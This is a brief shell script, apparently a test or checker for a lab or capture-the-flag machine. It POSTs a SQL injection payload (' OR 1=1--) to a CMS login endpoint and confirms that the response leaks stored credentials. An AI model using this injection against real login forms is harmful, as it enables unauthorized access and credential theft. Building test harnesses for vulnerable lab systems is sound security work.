set -eu
out=$(curl -fsS -X POST -d "username=' OR 1=1--&password=x" "http://${BOX_HOST}:8096/login")
echo "$out"
echo "$out" | grep -q "user=$BOX_U" && echo "$out" | grep -q "pass=$BOX_P" \
    || { echo "CMS SQL injection did not return credentials" >&2; exit 1; }
